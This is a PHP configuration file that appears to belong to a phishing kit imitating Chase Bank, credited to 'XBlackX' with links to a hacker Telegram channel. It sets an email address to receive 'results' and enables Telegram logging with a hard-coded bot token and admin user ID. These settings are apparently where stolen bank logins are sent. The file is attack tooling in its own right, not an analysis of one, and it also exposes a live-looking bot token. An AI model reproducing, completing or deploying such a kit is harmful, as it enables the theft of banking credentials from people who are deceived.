<?php
###############################################
/**
 * @since             14/03/2021
 * @package           Chase
 * @telegram          @XBlackX_Coder
 * TeleGram Channel   https://t.me/Anonymous_Hackez_Channel
 * Project Name:      Chase Bank
 * Author:            XBlackX
 * Author URI:        https://t.me/XBlackX_Coder
 */
###############################################
$toEmail = "xbalckxcoder@gmail.com"; //use "yourfirst@email.com, yoursecond@email.com" for receive result in multiple emails
################################################
$Telegram_Logs = "yes";
const TELEGRAM_BOT_TOKEN = '1701471936:AAFRJ8_gBD9Rup-Rx4CxWvsZ94hkiyUFWiI';
const TELEGRAM_BOT_ADMIN_USERID = 1509832725;
const TELEGRAM_BOT_REPORT_EVERY_TIME = false;